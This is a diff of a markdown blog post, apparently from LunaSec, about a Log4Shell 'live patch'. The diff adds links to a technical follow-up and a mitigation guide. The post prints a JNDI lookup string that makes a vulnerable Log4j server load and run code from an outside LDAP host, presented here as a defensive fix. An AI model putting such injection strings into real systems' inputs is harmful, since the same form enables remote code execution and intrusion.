@@ -36,11 +36,16 @@ authors:
 -->
 
 **TL;DR:** This string will temporarily fix your systems by patching them against Log4Shell, but *please* read the rest
-of this post before you use it!
+of this post before you use it! **Update:** We
+[posted a follow-up post](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical) with a technical deep-dive
+into how this exploit works.
 
 ```
 ${jndi:ldap://patch.log4shell.com:1389/a}
 ```
+
+_If you're looking for resources on how to detect and patch yourself against Log4Shell, please also read our in-depth
+[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide)._
 
 ## Why Log4Shell is an especially painful vulnerability
 
